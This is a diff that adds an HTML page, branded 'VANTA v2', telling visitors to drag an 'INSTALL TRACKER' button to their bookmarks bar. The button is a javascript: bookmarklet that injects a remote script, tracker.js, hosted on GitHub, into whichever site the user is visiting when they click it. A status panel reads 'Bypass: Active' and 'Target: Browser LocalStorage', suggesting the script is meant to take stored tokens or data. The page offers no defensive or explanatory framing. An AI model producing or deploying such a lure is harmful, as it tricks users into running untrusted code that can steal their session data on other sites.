@@ -1,1 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanta Research -</title>
+    <style>
+        :root { --neon: #00ff88; --bg: #0a0a0a; --card: #111; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; text-align: center; padding-top: 100px; }
+        .container { max-width: 600px; margin: auto; padding: 20px; border: 1px solid #333; border-radius: 12px; background: var(--card); }
+        h1 { color: var(--neon); font-size: 2.5rem; margin-bottom: 10px; }
+        p { color: #888; margin-bottom: 30px; }
+        .install-btn {
+            display: inline-block;
+            padding: 18px 40px;
+            background: linear-gradient(135deg, var(--neon), #00cc66);
+            color: #000;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 800;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+            cursor: move;
+        }
+        .code-preview { background: #000; padding: 15px; border-radius: 8px; text-align: left; font-size: 12px; color: #666; margin-top: 20px; }
+    </style>
+</head>
+<body>
 
+<div class="container">
+    <h1>VANTA v2</h1>
+    <p>Drag the button below to your bookmarks bar to initialize the tracker.</p>
+
+    <a href="javascript:(function(){
+        const s = document.createElement('script');
+        s.src = 'https://github.com/Jinxthesimp/Dropshipper/blob/main/tracker.js'; 
+        document.body.appendChild(s);
+    })();" class="install-btn">
+        INSTALL TRACKER
+    </a>
+
+    <div class="code-preview">
+        Status: Ready for deployment<br>
+        Bypass: Active<br>
+        Target: Browser LocalStorage
+    </div>
+</div>
+
+</body>
+</html>
